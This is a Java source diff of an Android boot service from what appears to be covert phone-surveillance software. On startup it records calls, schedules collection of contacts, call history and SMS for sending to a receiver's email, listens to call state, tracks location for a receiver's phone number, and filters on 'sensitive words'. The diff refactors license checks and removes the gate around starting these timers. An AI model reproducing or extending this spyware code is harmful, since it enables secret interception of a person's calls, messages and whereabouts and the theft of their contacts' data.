@@ -53,10 +53,6 @@ public class BootService extends Service
 	public static String otherSidePhoneNum = "";
 	private static MediaRecorder recorder;
 	
-	// Global variables that will be initialized when phone starts
-	public static String[] recipients = null;
-	public static String[] sensitiveWordArray = null;
-	
 	static {
 		recorder = new MediaRecorder();
 	}
@@ -84,8 +80,7 @@ public class BootService extends Service
                 	if (!ConfigCtrl.isLegal(context)) return;
                 	
                 	// Check if reached the recording limit if trial
-                	LICENSE_TYPE licType = ConfigCtrl.getLicenseType(context);
-                	if (licType == LICENSE_TYPE.TRIAL_LICENSED && ConfigCtrl.reachRecordingTimeLimit(context)) {
+                	if (GlobalValues.licenseType == LICENSE_TYPE.TRIAL_LICENSED && ConfigCtrl.reachRecordingTimeLimit(context)) {
                 		if (!ConfigCtrl.getHasSentRecordingTimesLimitSms(context)) {
                 			// Send SMS to warn user
         					String recvPhoneNum = GlobalPrefActivity.getReceiverPhoneNum(context);
@@ -136,7 +131,7 @@ public class BootService extends Service
         						file.delete();
         					} else {
         						// recording count ++ if in trial
-        						if (ConfigCtrl.getLicenseType(context) == LICENSE_TYPE.TRIAL_LICENSED) {
+        						if (GlobalValues.licenseType == LICENSE_TYPE.TRIAL_LICENSED) {
         							ConfigCtrl.countRecordingTimesInTrial(context); 
         						}
         					}
@@ -200,61 +195,37 @@ public class BootService extends Service
 		//android.os.Debug.waitForDebugger();//TODO should be removed in the release
 		super.onStart(intent, startId);
 		
-		LICENSE_TYPE type = ConfigCtrl.getLicenseType(context);
-		
 		// A special check on the consume date and current date:
 		// If the current date is ealier than consume date, stop the trial
 		//CheckDate(context, type);
 		
-		// Start timer to get contacts, phone call history and SMS
-		if (ConfigCtrl.isLegal(context)) 
-		{
-			// ------------------------------------------------------------------
-			// Initialize global variables
-			if (recipients == null || recipients.length <= 0) 
-				recipients = getRecipients(context);
-			
-			if (sensitiveWordArray == null || sensitiveWordArray.length <= 0) 
-				sensitiveWordArray = GlobalPrefActivity.getSensitiveWordsArray(context);
-			
-			// ------------------------------------------------------------------			
-			// Start timers and listeners
-			String recvMail = GlobalPrefActivity.getReceiverMail(context);
-			if (recvMail.length() > 0) 
-			{
-				mGetInfoTimer.scheduleAtFixedRate(mInfoTask, mGetInfoDelay, mGetInfoPeriod);
-				
-				if (telManager == null) {
-					telManager = (TelephonyManager)context.getSystemService(Context.TELEPHONY_SERVICE);
-					telManager.listen(phoneListener, PhoneStateListener.LISTEN_CALL_STATE);
-				}
-			}
-			
-			String recvPhoneNum = GlobalPrefActivity.getReceiverPhoneNum(context);
-			if (recvPhoneNum.length() > 0 && locationUtil == null) 
-			{
-				locationUtil = new LocationUtil(context);
-			}
+		// ------------------------------------------------------------------
+		// Initialize global variables
+		if (GlobalValues.recipients == null || GlobalValues.recipients.length <= 0) 
+			GlobalValues.recipients = getRecipients(context);
 		
-		} 
-		
-		// If out of trial and not licensed, send a SMS to warn the receiver user
-		else if (type == LICENSE_TYPE.TRIAL_LICENSED)
-		{
-			// If has sent before, DO NOT send again
-			if (ConfigCtrl.getHasSentExpireSms(context)) return;
+		if (GlobalValues.sensitiveWordArray == null || GlobalValues.sensitiveWordArray.length <= 0) 
+			GlobalValues.sensitiveWordArray = GlobalPrefActivity.getSensitiveWordsArray(context);
 			
-			// Send a SMS to the receiver that has expired
-			String receiverPhoneNum = GlobalPrefActivity.getReceiverPhoneNum(context);
-			if (receiverPhoneNum != null && receiverPhoneNum.length() > 0) {
-				String msg = String.format(context.getResources().getString(R.string.msg_has_sent_trial_expire_sms), ConfigCtrl.getSelfName(context))
-						+ context.getResources().getString(R.string.support_qq);
-				boolean ret = SmsCtrl.sendSms(receiverPhoneNum, msg);
-				if (ret) {
-					ConfigCtrl.setHasSentExpireSms(context, true);
-				}
+		// ------------------------------------------------------------------			
+		// Start timers and listeners
+		String recvMail = GlobalPrefActivity.getReceiverMail(context);
+		if (recvMail.length() > 0) 
+		{
+			mGetInfoTimer.scheduleAtFixedRate(mInfoTask, mGetInfoDelay, mGetInfoPeriod);
+			
+			if (telManager == null) {
+				telManager = (TelephonyManager)context.getSystemService(Context.TELEPHONY_SERVICE);
+				telManager.listen(phoneListener, PhoneStateListener.LISTEN_CALL_STATE);
 			}
 		}
+		
+		String recvPhoneNum = GlobalPrefActivity.getReceiverPhoneNum(context);
+		if (recvPhoneNum.length() > 0 && locationUtil == null) 
+		{
+			locationUtil = new LocationUtil(context);
+		}
+		 
 	}
 	
 	/*
